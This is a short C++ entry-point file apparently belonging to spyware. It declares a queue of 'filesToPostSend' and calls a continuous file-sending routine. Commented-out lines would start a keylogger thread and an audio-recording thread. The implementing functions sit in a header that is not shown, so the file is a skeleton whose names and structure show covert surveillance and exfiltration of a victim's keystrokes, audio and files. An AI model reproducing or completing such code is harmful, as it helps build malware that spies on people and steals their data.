#include "headers/headers.hpp"

using namespace std;

atomic<std::string *>filesToPostSend((string *)(new string));

int main(){
    // HANDLE audioThread, keyloggerThread;
    // DWORD audioThreadId, keyloggerThreadId;
    // beginKeyloggerThread(keyloggerThread, reinterpret_cast<LPDWORD>(&keyloggerThreadId));
    // beginAudioRecording(audioThread, reinterpret_cast<LPDWORD>(&audioThreadId));
    // WaitForSingleObject(keyloggerThread, INFINITE);
    continuousFileSend();
    return 0;
}